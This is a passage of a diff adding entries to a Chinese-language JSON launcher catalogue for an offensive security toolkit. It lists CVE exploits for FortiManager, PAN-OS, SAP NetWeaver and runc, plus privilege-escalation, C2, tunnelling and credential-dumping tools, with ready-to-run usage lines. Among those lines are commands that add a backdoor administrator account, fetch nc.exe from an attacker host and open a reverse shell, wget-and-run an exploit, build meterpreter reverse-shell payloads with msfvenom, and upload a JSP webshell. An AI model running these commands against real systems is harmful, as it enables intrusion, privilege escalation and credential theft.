+    "description": "CVE-2024-47575 FortiManager未认证RCE - FortiJump (CVSS 9.8)\n影响: FortiManager 6.2/6.4/7.0/7.2/7.4/7.6多版本\n原理: fgfmd守护进程缺少证书验证，未授权注册伪造设备执行命令\n2024年10月起被多个APT组织大规模利用(UNC3886等)\n用法:\n  python3 CVE-2024-47575.py -t fortimanager-ip  (检测)\n  python3 CVE-2024-47575.py -t fortimanager-ip --cmd id  (命令执行)\n配套: w00t_cert.bin/w00t_key.bin (伪造FortiGate证书)\n路径: ~/Workspace/security/poc/2024-2025-cve/CVE-2024-47575-fortijump/",
+    "available": true
+  },
+  {
+    "id": "cve-2024-3400-pan-os-rce",
+    "name": "CVE-2024-3400 (PAN-OS命令注入RCE)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-3400-paloalto/main.py",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "paloalto",
+      "pan-os",
+      "globalprotect",
+      "rce",
+      "0day",
+      "2024"
+    ],
+    "description": "CVE-2024-3400 Palo Alto PAN-OS GlobalProtect OS命令注入 (CVSS 10.0)\n影响: PAN-OS 10.2/11.0/11.1 + GlobalProtect gateway/portal启用\n原理: GlobalProtect功能Session ID注入系统命令，无需认证\n2024年4月已被UTA0218(北韩APT)0day在野利用\n用法:\n  python3 main.py  (交互式输入目标IP列表文件)\n  目标确认后执行命令注入\n路径: ~/Workspace/security/poc/2024-2025-cve/CVE-2024-3400-paloalto/",
+    "available": true
+  },
+  {
+    "id": "cve-2024-21626-runc",
+    "name": "CVE-2024-21626 (runc容器逃逸)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-21626-runc",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "docker",
+      "runc",
+      "container-escape",
+      "lpe",
+      "2024"
+    ],
+    "description": "CVE-2024-21626 runc文件描述符泄露容器逃逸 - Leaky Vessels (CVSS 8.6)\n影响: runc <= 1.1.11 (Docker/Podman/containerd/CRI-O全受影响)\n原理: runc WORKDIR处理不当导致文件描述符泄露至宿主机，容器逃逸至宿主\n用法:\n  在目标容器内编译执行exploit\n  # 需要特定条件: 对Dockerfile WORKDIR的控制 或 特殊镜像\n路径: ~/Workspace/security/poc/2024-2025-cve/CVE-2024-21626-runc/\n参考: 与CVE-2024-21626一同披露的还有CVE-2024-23651/23652/23653\n\n⚠️ Mac不可直接执行（Linux编译目标/Go源码），双击在Finder中打开目录查看",
+    "available": true
+  },
+  {
+    "id": "cve-2025-0411-7-zip-motw",
+    "name": "CVE-2025-0411 (7-Zip MotW绕过)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2025-0411-7zip",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "7zip",
+      "motw",
+      "windows",
+      "bypass",
+      "social-eng",
+      "2025"
+    ],
+    "description": "CVE-2025-0411 7-Zip Mark-of-the-Web绕过 (CVSS 7.0)\n影响: 7-Zip < 24.09 (已被SmokeLoader在野利用)\n原理: 双层嵌套压缩包(outer.7z > inner.zip)，解压后内层文件无MotW标记\n      Windows安全警告被绕过，直接执行恶意程序\n场景: 社会工程学攻击，钓鱼邮件附件\n用法: 生成特制7z文件，目标使用7-Zip解压后直接运行恶意程序\n路径: ~/Workspace/security/poc/2024-2025-cve/CVE-2025-0411-7zip/\n\n⚠️ Mac不可直接执行（Linux编译目标/Go源码），双击在Finder中打开目录查看",
+    "available": true
+  },
+  {
+    "id": "cve-2024-8190-ivanti-csa-rce",
+    "name": "CVE-2024-8190 (Ivanti CSA RCE)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-8190-ivanti",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "ivanti",
+      "csa",
+      "rce",
+      "command-injection",
+      "2024"
+    ],
+    "description": "CVE-2024-8190 Ivanti Cloud Services Appliance命令注入RCE\n影响: Ivanti CSA <= 4.6 (已超EoL，配合CVE-2024-8963路径穿越形成利用链)\n原理: /gsb/reports.php参数注入，配合认证绕过完成无认证RCE\n利用链: CVE-2024-8963(路径穿越/未授权) + CVE-2024-8190(命令注入)\n      + CVE-2024-9380(另一个OS注入，CVSS 9.1)\n路径: ~/Workspace/security/poc/2024-2025-cve/CVE-2024-8190-ivanti/\n参考: Horizon3.ai原始研究\n\n⚠️ Mac不可直接执行（Linux编译目标/Go源码），双击在Finder中打开目录查看",
+    "available": true
+  },
+  {
+    "id": "godpotato-windows",
+    "name": "GodPotato (Windows全版本提权)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/privesc/GodPotato",
+    "category": "privesc-win",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "windows",
+      "privesc",
+      "impersonate",
+      "potato",
+      "system"
+    ],
+    "description": "GodPotato Windows本地提权工具，支持2012~2022全版本\n条件: 需要SeImpersonatePrivilege/SeAssignPrimaryTokenPrivilege权限\n      (IIS/MSSQL/Exchange/Tomcat等WebShell默认具备此权限)\n原理: 利用DCOM rpcss接口的ImpersonateClient缺陷，从低权限→SYSTEM\n用法:\n  GodPotato.exe -cmd \"cmd /c whoami\"        (测试命令)\n  GodPotato.exe -cmd \"cmd /c net user hacker P@ss /add && net localgroup administrators hacker /add\"\n  GodPotato.exe -cmd \"cmd /c certutil -urlcache -split -f http://攻击机/nc.exe nc.exe && nc.exe -e cmd 攻击机 4444\"\n需要: .NET 4.0+环境，提前在目标上传GodPotato.exe\n路径: ~/Workspace/security/poc/privesc/GodPotato/ (C#源码)",
+    "available": true
+  },
+  {
+    "id": "pwnkit-cve-2021-4034-linux",
+    "name": "PwnKit CVE-2021-4034 (Linux提权)",
+    "type": "shell",
+    "path": "~/Workspace/security/poc/privesc/PwnKit/PwnKit.sh",
+    "category": "privesc-linux",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "linux",
+      "lpe",
+      "polkit",
+      "pkexec",
+      "root"
+    ],
+    "description": "PwnKit - CVE-2021-4034 Linux pkexec 本地提权\n  PoC 脚本: ~/Workspace/security/poc/privesc/PwnKit/PwnKit.sh\n  影响范围: Linux pkexec < 0.105 (几乎所有 Linux 发行版)\n使用说明:\n  1. 将 PwnKit.sh 上传到目标 Linux 机器\n  2. chmod +x PwnKit.sh && ./PwnKit.sh\n  3. 脚本自动从网络下载编译好的二进制并执行\n离线版:\n  git clone https://github.com/ly4k/PwnKit.git && cd PwnKit\n  make && ./PwnKit\n注意: 需要在目标 Linux 机器上执行，不在 Mac 本地运行\n验证漏洞: pkexec --version (< 0.105 可能存在)",
+    "available": true
+  },
+  {
+    "id": "dirtypipe-cve-2022-0847-linux",
+    "name": "DirtyPipe CVE-2022-0847 (Linux内核写)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/privesc/DirtyPipe",
+    "category": "privesc-linux",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "linux",
+      "kernel",
+      "pipe",
+      "lpe",
+      "root",
+      "overwrite"
+    ],
+    "description": "CVE-2022-0847 Dirty Pipe Linux内核管道覆写只读文件\n影响: Linux kernel 5.8~5.16.11 / 5.15.25 / 5.10.102\n原理: pipe缺少初始化，可覆写任意只读文件 (如/etc/passwd/suid二进制)\n两种利用方式:\n  exploit-1.c: 覆写SUID文件注入shellcode，执行后恢复原文件\n  exploit-2.c: 覆写/etc/passwd添加root用户\n用法 (在目标Linux机器上):\n  gcc exploit-1.c -o exploit && ./exploit /usr/bin/passwd  (修改SUID)\n  gcc exploit-2.c -o exploit && ./exploit                  (修改passwd)\n路径: ~/Workspace/security/poc/privesc/DirtyPipe/\n\n⚠️ Mac不可直接执行（Linux编译目标/Go源码），双击在Finder中打开目录查看",
+    "available": true
+  },
+  {
+    "id": "printspoofer-windows-spooler",
+    "name": "PrintSpoofer (Windows Spooler提权)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/privesc/PrintSpoofer",
+    "category": "privesc-win",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "windows",
+      "lpe",
+      "print-spooler",
+      "system",
+      "impersonate"
+    ],
+    "description": "PrintSpoofer Windows Print Spooler服务提权到SYSTEM\n影响: Windows 10/Server 2019 (部分版本，GodPotato更通用)\n条件: SeImpersonatePrivilege权限\n原理: 利用Print Spooler本地RPC接口的身份模拟缺陷\n用法:\n  PrintSpoofer.exe -i -c cmd.exe    (弹出SYSTEM交互shell)\n  PrintSpoofer.exe -c \"whoami\"      (执行命令)\n  PrintSpoofer.exe -c \"net user hacker P@ss /add\"\n路径: ~/Workspace/security/poc/privesc/PrintSpoofer/ (C#源码)\n对比: GodPotato覆盖范围更广(2012~2022)，优先使用GodPotato",
+    "available": true
+  },
+  {
+    "id": "juicypotatong-windows",
+    "name": "JuicyPotatoNG (Windows高版本提权)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/privesc/JuicyPotatoNG",
+    "category": "privesc-win",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "windows",
+      "lpe",
+      "potato",
+      "dcom",
+      "system"
+    ],
+    "description": "JuicyPotatoNG JuicyPotato新版，解决Win10 1809+兼容性\n条件: SeImpersonatePrivilege或SeAssignPrimaryTokenPrivilege\n原理: 新CLSID + 自动枚举可用COM对象，避开旧版局限\n用法:\n  JuicyPotatoNG.exe -t * -p cmd.exe -a \"/c whoami > C:\\out.txt\"\n  JuicyPotatoNG.exe -t * -p powershell.exe -a \"-enc BASE64_PAYLOAD\"\n路径: ~/Workspace/security/poc/privesc/JuicyPotatoNG/ (C++源码)\n提权优先级: GodPotato > JuicyPotatoNG > PrintSpoofer",
+    "available": true
+  },
+  {
+    "id": "cve-2026-31431-copyfail-linux",
+    "name": "CVE-2026-31431 CopyFail (Linux内核提权)",
+    "type": "python",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2026-31431-copyfail/copy_fail_exp.py",
+    "category": "privesc-linux",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "linux",
+      "kernel",
+      "lpe",
+      "af_alg",
+      "splice",
+      "root",
+      "2026",
+      "copyfail",
+      "cisa-kev"
+    ],
+    "description": "CVE-2026-31431 CopyFail — Linux内核AF_ALG模块本地提权 (CVSS 7.8 | CISA KEV)\n影响: Linux kernel 2017+ | Ubuntu 24.04 / RHEL / Debian / Amazon Linux / SUSE / Arch\n原理: AF_ALG socket + authencesn加密模板 + splice() 系统调用\n      → 对内存页缓存中setuid二进制(如/usr/bin/su)写入4字节\n      → 无需磁盘写权限，stealthy 零日提权到root\n\nPoC版本:\n  Python版 (732字节，需靶机有Python3):\n    python3 copy_fail_exp.py   → 直接 root shell\n  Go静态版 (无依赖，跨发行版):\n    ~/Workspace/security/poc/2024-2025-cve/CVE-2026-31431-copyfail-go/copyfail-go\n\n传送到靶机:\n  python3 -m http.server 8888   (攻击机起服务)\n  wget http://攻击机:8888/copy_fail_exp.py && python3 copy_fail_exp.py\n\n注意: 利用完毕后内存修改自动恢复，不留磁盘痕迹\n缓解: 升级内核 / echo 1 > /proc/sys/kernel/modules_disabled (临时)\n路径: ~/Workspace/security/poc/2024-2025-cve/CVE-2026-31431-copyfail/",
+    "available": true
+  },
+  {
+    "id": "poc",
+    "name": "POC库同步更新",
+    "type": "shell",
+    "path": "~/Workspace/security/tools/TH_Tools/tools/_launchers/poc-update-shell.sh",
+    "category": "other",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "poc",
+      "update",
+      "sync",
+      "git"
+    ],
+    "description": "POC/EXP库一键同步更新管理器\n功能:\n  - 全量 git pull 更新所有CVE EXP / 综合集合库 / 提权工具\n  - 查看更新日志（.update-log/目录）\n  - 配置cron定时更新（每天03:00自动同步）\n库列表:\n  2024-2025-cve/ → 31个精准CVE EXP（含各自USAGE.md文档）\n  collections/   → 10个综合POC集合（POC-2025/MDPOCS/HAC/等）\n  privesc/       → 5个提权工具（GodPotato/PwnKit/DirtyPipe等）\n手动更新: bash ~/Workspace/security/poc/update-all.sh --all",
+    "available": true
+  },
+  {
+    "id": "cve-2024-38816-spring",
+    "name": "CVE-2024-38816 (Spring路径穿越)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2024-38816-spring",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "spring",
+      "path-traversal",
+      "lfi",
+      "2024"
+    ],
+    "description": "CVE-2024-38816 Spring Framework路径穿越读取任意文件 (CVSS 7.5)\n影响: Spring 5.3.0~5.3.39 / 6.0.0~6.0.23 / 6.1.0~6.1.12\n条件: 使用RouterFunctions+FileSystemResource提供静态资源\n用法:\n  curl http://target/static/../../WEB-INF/web.xml\n  curl http://target/resources/../../../etc/passwd\n检测:\n  nuclei -u http://target -t cves/2024/CVE-2024-38816.yaml\n注意: 非RCE，但可读取配置文件/凭据/Spring配置获取数据库密码等\n\n⚠️ Mac不可直接执行（Linux编译目标/Go源码），双击在Finder中打开目录查看",
+    "available": true
+  },
+  {
+    "id": "cve-2025-31324-sap-netweaver-rce",
+    "name": "CVE-2025-31324 (SAP NetWeaver RCE)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/2024-2025-cve/CVE-2025-31324-sap",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "sap",
+      "netweaver",
+      "file-upload",
+      "rce",
+      "apt",
+      "2025"
+    ],
+    "description": "CVE-2025-31324 SAP NetWeaver Visual Composer 无认证JSP上传RCE (CVSS 9.8)\n影响: SAP NetWeaver 7.xx系列（Visual Composer组件）\n原理: /developmentserver/metadatauploader端点无任何认证，可直接上传JSP WebShell\n2025年4月底被中国APT组织在野利用，已进入CISA KEV\n用法:\n  python3 Scanner_CVE-2025-31324.py -u http://sap-target    (检测)\n  上传payload: PUT /developmentserver/metadatauploader/shell.jsp\n  访问shell: http://target/developmentserver/metadatauploader/shell.jsp\n特征识别: URL包含 /irj/portal 或 /webdynpro/ 的SAP系统\n\n⚠️ Mac不可直接执行（Linux编译目标/Go源码），双击在Finder中打开目录查看",
+    "available": true
+  },
+  {
+    "id": "poclib-2024-2024-poc",
+    "name": "PocLib-2024 (2024年分月POC)",
+    "type": "gui",
+    "path": "~/Workspace/security/poc/collections/PocLib-2024",
+    "category": "java-fw",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "poc",
+      "2024",
+      "nuclei",
+      "xray",
+      "monthly"
+    ],
+    "description": "k3ppf0r/2024-PocLib 2024年漏洞按月归档+Nuclei/Xray双格式模板\n结构: 按时间归档(2024-4-30/5-11/5-17/6-07等)\n格式: nuclei_templates/ + xray_templates/ 双格式\n覆盖: 泛微/用友/致远/帆软等国内OA + Apache/Spring等中间件\n用法:\n  nuclei -l targets.txt -t collections/PocLib-2024/nuclei_templates/\n  xray ws --plugins --poc collections/PocLib-2024/xray_templates/*.yaml\n特点: 每期含当月最新高危漏洞，武器化程度高，可直接跑",
+    "available": true
+  },
+  {
+    "id": "amass-enum",
+    "name": "amass enum",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/amass",
+    "category": "subdomain",
+    "env_id": null,
+    "args": "enum -passive -d example.com",
+    "tags": [
+      "子域名",
+      "资产发现",
+      "OSINT"
+    ],
+    "description": "综合资产发现 (子域名+ASN+IP)\n常用命令:\n  amass enum -passive -d target.com\n  amass enum -active -d target.com -brute\n  amass intel -whois -d target.com\n  amass db -show -d target.com",
+    "available": true
+  },
+  {
+    "id": "httpx",
+    "name": "httpx",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/httpx",
+    "category": "fingerprint",
+    "env_id": null,
+    "args": "-l urls.txt -status-code -title -tech-detect",
+    "tags": [
+      "HTTP探测",
+      "Web存活",
+      "指纹"
+    ],
+    "description": "HTTP探测与指纹识别\n常用命令:\n  cat urls.txt | httpx -status-code -title -tech-detect\n  echo target.com | httpx -probe -silent\n  httpx -l hosts.txt -o alive.txt -sc -ct -title\n  httpx -l hosts.txt -screenshot -srd screens/",
+    "available": true
+  },
+  {
+    "id": "wafw00f",
+    "name": "wafw00f",
+    "type": "shell",
+    "path": "~/.local/bin/wafw00f",
+    "category": "fingerprint",
+    "env_id": null,
+    "args": "https://example.com",
+    "tags": [
+      "WAF识别",
+      "指纹"
+    ],
+    "description": "WAF识别工具\n常用命令:\n  wafw00f https://target.com\n  wafw00f -a https://target.com  (枚举所有WAF)\n  wafw00f -i targets.txt",
+    "available": true
+  },
+  {
+    "id": "gitleaks",
+    "name": "gitleaks",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/gitleaks",
+    "category": "recon-misc",
+    "env_id": null,
+    "args": "detect --source . -v",
+    "tags": [
+      "Secret扫描",
+      "敏感信息"
+    ],
+    "description": "Git仓库敏感信息扫描\n常用命令:\n  gitleaks detect --source . -v\n  gitleaks detect --source /path/to/repo --report-path report.json\n  gitleaks detect --log-opts 'HEAD~10..HEAD'",
+    "available": true
+  },
+  {
+    "id": "ffuf",
+    "name": "ffuf",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/ffuf",
+    "category": "dir-fuzz",
+    "env_id": null,
+    "args": "-u https://example.com/FUZZ -w wordlist.txt",
+    "tags": [
+      "目录爆破",
+      "Fuzz",
+      "参数爆破"
+    ],
+    "description": "高速Web模糊测试\n常用命令:\n  ffuf -u https://target.com/FUZZ -w /path/to/wordlist.txt\n  ffuf -u https://target.com/FUZZ -w list.txt -fc 404\n  ffuf -u https://target.com/?FUZZ=test -w params.txt\n  ffuf -u https://target.com/FUZZ -w list.txt -e .php,.bak,.zip",
+    "available": true
+  },
+  {
+    "id": "sqlmap",
+    "name": "sqlmap",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/sqlmap",
+    "category": "sqli",
+    "env_id": null,
+    "args": "-u 'http://example.com/page?id=1' --batch",
+    "tags": [
+      "SQL注入",
+      "数据库"
+    ],
+    "description": "自动化SQL注入利用\n常用命令:\n  sqlmap -u 'http://target.com/?id=1' --batch --dbs\n  sqlmap -u 'http://target.com/?id=1' -D dbname --tables\n  sqlmap -r request.txt --level=5 --risk=3\n  sqlmap -u 'http://target.com/?id=1' --os-shell\n  sqlmap -u 'http://target.com/?id=1' --tamper=space2comment",
+    "available": true
+  },
+  {
+    "id": "dalfox",
+    "name": "dalfox",
+    "type": "shell",
+    "path": "~/go/bin/dalfox",
+    "category": "xss",
+    "env_id": null,
+    "args": "url https://example.com/search?q=",
+    "tags": [
+      "XSS",
+      "高速扫描"
+    ],
+    "description": "高速XSS扫描利用\n常用命令:\n  dalfox url 'https://target.com/search?q=test'\n  dalfox file urls.txt --worker 50\n  cat params.txt | dalfox pipe\n  dalfox url 'https://target.com/?q=test' --blind your-xss-hunter.com",
+    "available": true
+  },
+  {
+    "id": "sstimap",
+    "name": "SSTImap",
+    "type": "python",
+    "path": "~/Workspace/security/tools/web/SSTImap/sstimap.py",
+    "category": "ssti-cmdi",
+    "env_id": "py-brew-3-12",
+    "args": "-u https://example.com/?name=",
+    "tags": [
+      "SSTI",
+      "模板注入"
+    ],
+    "description": "服务端模板注入(SSTI)检测与利用\n常用命令:\n  sstimap -u 'https://target.com/?name=test'\n  sstimap -u 'https://target.com/page' -d 'field=test'\n  sstimap -u 'https://target.com/?tpl=' --os-cmd 'id'",
+    "available": true
+  },
+  {
+    "id": "commix",
+    "name": "commix",
+    "type": "shell",
+    "path": "~/.local/bin/commix",
+    "category": "ssti-cmdi",
+    "env_id": null,
+    "args": "--url='http://example.com/?cmd=whoami'",
+    "tags": [
+      "命令注入",
+      "RCE"
+    ],
+    "description": "命令注入自动化利用\n常用命令:\n  commix --url='http://target.com/?param=test'\n  commix -r request.txt --data='field=test'\n  commix --url='http://target.com/page' --technique=all",
+    "available": true
+  },
+  {
+    "id": "byp4xx",
+    "name": "byp4xx",
+    "type": "shell",
+    "path": "~/go/bin/byp4xx",
+    "category": "web-bypass",
+    "env_id": null,
+    "args": "https://example.com/admin",
+    "tags": [
+      "403绕过",
+      "权限绕过"
+    ],
+    "description": "403/401/40x 状态码绕过\n常用命令:\n  byp4xx https://target.com/forbidden-path\n  byp4xx -X POST https://target.com/admin\n  byp4xx -d data https://target.com/page",
+    "available": true
+  },
+  {
+    "id": "bloodhound-py",
+    "name": "BloodHound.py",
+    "type": "shell",
+    "path": "~/.local/bin/bloodhound-python",
+    "category": "domain-enum",
+    "env_id": null,
+    "args": "-d DOMAIN -u user -p pass -c all --dns-tcp",
+    "tags": [
+      "域渗透",
+      "AD",
+      "图形化"
+    ],
+    "description": "AD域信息收集 (BloodHound数据源)\n常用命令:\n  bloodhound-python -d corp.local -u user -p pass -c all -ns <dc-ip>\n  bloodhound-python -d corp.local -u user -p pass -c DCOnly\n  bloodhound-python -d corp.local --auth-method kerberos -k",
+    "available": true
+  },
+  {
+    "id": "netexec-ldap",
+    "name": "netexec ldap",
+    "type": "shell",
+    "path": "~/.local/bin/netexec",
+    "category": "domain-enum",
+    "env_id": null,
+    "args": "ldap <dc_ip> -u user -p pass --users",
+    "tags": [
+      "LDAP",
+      "域枚举",
+      "AD"
+    ],
+    "description": "LDAP域用户/组枚举\n常用命令:\n  nxc ldap <dc> -u user -p pass --users\n  nxc ldap <dc> -u user -p pass --groups\n  nxc ldap <dc> -u user -p pass --asreproast asrep.txt\n  nxc ldap <dc> -u user -p pass --kerberoasting krb.txt\n  nxc ldap <dc> -u user -p pass --bloodhound -c all",
+    "available": true
+  },
+  {
+    "id": "kerbrute",
+    "name": "kerbrute",
+    "type": "shell",
+    "path": "~/go/bin/kerbrute",
+    "category": "domain-atk",
+    "env_id": null,
+    "args": "userenum -d DOMAIN --dc <dc_ip> users.txt",
+    "tags": [
+      "Kerberos",
+      "爆破",
+      "域用户枚举"
+    ],
+    "description": "Kerberos暴力破解与用户枚举\n常用命令:\n  kerbrute userenum -d corp.local --dc <dc-ip> users.txt\n  kerbrute passwordspray -d corp.local --dc <dc-ip> users.txt 'Pass123!'\n  kerbrute bruteuser -d corp.local --dc <dc-ip> admin users.txt",
+    "available": true
+  },
+  {
+    "id": "certipy",
+    "name": "certipy",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/certipy",
+    "category": "domain-atk",
+    "env_id": null,
+    "args": "find -u user@domain -p pass -dc-ip <dc_ip>",
+    "tags": [
+      "ADCS",
+      "证书攻击",
+      "ESC"
+    ],
+    "description": "Active Directory证书服务(ADCS)攻击\n常用命令:\n  certipy find -u user@corp.local -p pass -dc-ip <dc>  枚举证书模板\n  certipy req -u user@corp.local -p pass -ca CA -template Template  申请证书\n  certipy auth -pfx user.pfx  用证书认证获取NTLM hash\n  certipy shadow auto -u user@corp.local -p pass -account target",
+    "available": true
+  },
+  {
+    "id": "evil-winrm",
+    "name": "evil-winrm",
+    "type": "shell",
+    "path": "~/.local/bin/evil-winrm",
+    "category": "lateral",
+    "env_id": null,
+    "args": "-i <ip> -u admin -p password",
+    "tags": [
+      "WinRM",
+      "远程Shell",
+      "域"
+    ],
+    "description": "Windows远程管理Shell\n常用命令:\n  evil-winrm -i <target> -u admin -p 'pass'\n  evil-winrm -i <target> -u admin -H <ntlm-hash>\n  evil-winrm -i <target> -u admin -p pass -s scripts/\n  # 内置: upload/download, bypass AMSI, bypass ETW",
+    "available": true
+  },
+  {
+    "id": "mitm6",
+    "name": "mitm6",
+    "type": "shell",
+    "path": "~/.local/bin/mitm6",
+    "category": "domain-cred",
+    "env_id": null,
+    "args": "-d corp.local",
+    "tags": [
+      "IPv6",
+      "DHCPv6",
+      "域渗透"
+    ],
+    "description": "IPv6 DNS欺骗 + NTLM中继\n常用命令:\n  mitm6 -d corp.local -i eth0\n  # 配合ntlmrelayx使用:\n  impacket-ntlmrelayx -6 -wh attacker-wh -t smb://dc/\n  impacket-ntlmrelayx -6 -wh attacker-wh -t ldaps://dc --delegate-access",
+    "available": true
+  },
+  {
+    "id": "bloodyad",
+    "name": "bloodyAD",
+    "type": "shell",
+    "path": "~/.local/bin/bloodyad",
+    "category": "domain-enum",
+    "env_id": null,
+    "args": "--host <dc_ip> -d DOMAIN -u user -p pass get object 'CN=Users'",
+    "tags": [
+      "DACL",
+      "ACL滥用",
+      "域渗透"
+    ],
+    "description": "AD DACL/ACL权限滥用工具\n常用命令:\n  bloodyAD --host <dc> -d corp.local -u user -p pass get object 'CN=Domain Admins'\n  bloodyAD --host <dc> -d corp.local -u owner -p pass add genericAll targetUser\n  bloodyAD --host <dc> -d corp.local -u user -p pass set password targetUser 'NewPass123!'",
+    "available": true
+  },
+  {
+    "id": "pypykatz",
+    "name": "pypykatz",
+    "type": "shell",
+    "path": "~/.local/bin/pypykatz",
+    "category": "domain-cred",
+    "env_id": null,
+    "args": "lsa smb <ip> -u admin -p pass",
+    "tags": [
+      "mimikatz",
+      "凭证",
+      "LSASS"
+    ],
+    "description": "纯Python Mimikatz实现\n常用命令:\n  pypykatz lsa minidump lsass.dmp    分析内存dump\n  pypykatz registry --sam SAM --system SYSTEM  离线注册表\n  pypykatz lsa smb <target> -u admin -p pass  远程提取",
+    "available": true
+  },
+  {
+    "id": "chisel",
+    "name": "chisel",
+    "type": "shell",
+    "path": "~/go/bin/chisel",
+    "category": "tunnel",
+    "env_id": null,
+    "args": "client <server>:8080 R:socks",
+    "tags": [
+      "HTTP隧道",
+      "SOCKS5",
+      "反弹"
+    ],
+    "description": "Chisel HTTP 隧道 (Go 实现)\n  绝对路径: ~/go/bin/chisel\n常用场景:\n  # 反向 SOCKS5 代理\n  服务端: chisel server -p 8080 --reverse\n  客户端: chisel client 攻击机:8080 R:socks\n  # 端口转发 (远程 3389 → 本地 13389)\n  客户端: chisel client 攻击机:8080 R:13389:127.0.0.1:3389\n  # 正向 SOCKS5\n  服务端: chisel server -p 8080 --socks5\n  客户端: chisel client 服务端:8080 socks\n配合 proxychains:\n  proxychains4 nmap -sT -Pn 192.168.1.0/24",
+    "available": true
+  },
+  {
+    "id": "ligolo-proxy",
+    "name": "ligolo-proxy",
+    "type": "shell",
+    "path": "~/.local/bin/ligolo-proxy",
+    "category": "tunnel",
+    "env_id": null,
+    "args": "-selfcert -laddr 0.0.0.0:11601",
+    "tags": [
+      "TLS隧道",
+      "内网穿透",
+      "tun接口"
+    ],
+    "description": "Ligolo-ng 高性能 TLS 内网隧道\n  绝对路径: ~/.local/bin/ligolo-proxy\n使用步骤:\n  # 1. 攻击机启动 proxy (本机)\n  ligolo-proxy -selfcert -laddr 0.0.0.0:11601\n  # 2. 靶机上传并运行 agent\n  ./agent -connect 攻击机IP:11601 -ignore-cert\n  # 3. proxy UI 内操作\n  session              选择会话\n  ifconfig             查看目标内网网段\n  start                启动隧道\n  # 4. Mac 添加路由\n  sudo ifconfig lo0 alias 240.0.0.1\n  sudo route add -net 192.168.1.0/24 240.0.0.1\nagent 下载: https://github.com/nicocha30/ligolo-ng/releases",
+    "available": true
+  },
+  {
+    "id": "msfconsole",
+    "name": "msfconsole",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/msfconsole",
+    "category": "c2",
+    "env_id": null,
+    "args": "-q",
+    "tags": [
+      "Metasploit",
+      "C2",
+      "漏洞利用"
+    ],
+    "description": "Metasploit框架 — 实测可用\n  /opt/homebrew/bin/msfconsole\n常用:\n  msfconsole -q                    静默启动\n  use exploit/multi/handler\n  set payload windows/x64/meterpreter/reverse_tcp\n  set LHOST 0.0.0.0; set LPORT 4444; run\n  msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x LPORT=4444 -f exe > shell.exe\n  msfvenom -p linux/x64/shell_reverse_tcp LHOST=x LPORT=4444 -f elf > shell.elf",
+    "available": true
+  },
+  {
+    "id": "sliver",
+    "name": "sliver",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/sliver",
+    "category": "c2",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "C2",
+      "隐蔽",
+      "Go"
+    ],
+    "description": "现代化C2框架(Sliver)\n常用命令:\n  sliver                         进入交互式控制台\n  # 在console内:\n  generate --mtls <attacker-ip>:443 --os windows\n  mtls --lport 443               启动MTLS监听\n  sessions                       查看会话\n  use <session-id>; shell        获取Shell",
+    "available": true
+  },
+  {
+    "id": "hashcat",
+    "name": "hashcat",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/hashcat",
+    "category": "password",
+    "env_id": null,
+    "args": "-m 1000 hashes.txt rockyou.txt",
+    "tags": [
+      "GPU破解",
+      "哈希",
+      "密码"
+    ],
+    "description": "GPU加速哈希破解\n常用命令:\n  hashcat -m 1000 ntlm.txt rockyou.txt       NTLM破解\n  hashcat -m 18200 asrep.txt rockyou.txt     AS-REP Roasting\n  hashcat -m 13100 krb5tgs.txt rockyou.txt   Kerberoasting\n  hashcat -m 22000 wpa.hccapx rockyou.txt    WPA2破解\n  hashcat -m 1000 hash.txt rockyou.txt -r rules/best64.rule",
+    "available": true
+  },
+  {
+    "id": "john",
+    "name": "john",
+    "type": "shell",
+    "path": "/opt/homebrew/bin/john",
+    "category": "password",
+    "env_id": null,
+    "args": "--wordlist=rockyou.txt hash.txt",
+    "tags": [
+      "破解",
+      "哈希",
+      "密码"
+    ],
+    "description": "John the Ripper密码破解\n常用命令:\n  john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt\n  john --format=NT hash.txt --wordlist=list.txt\n  ssh2john id_rsa > id_rsa.hash && john id_rsa.hash\n  zip2john secret.zip > zip.hash && john zip.hash",
+    "available": true
+  },
+  {
+    "id": "pacu",
+    "name": "pacu",
+    "type": "shell",
+    "path": "~/.local/bin/pacu",
+    "category": "cloud",
+    "env_id": null,
+    "args": "",
+    "tags": [
+      "AWS渗透",
+      "云安全"
+    ],
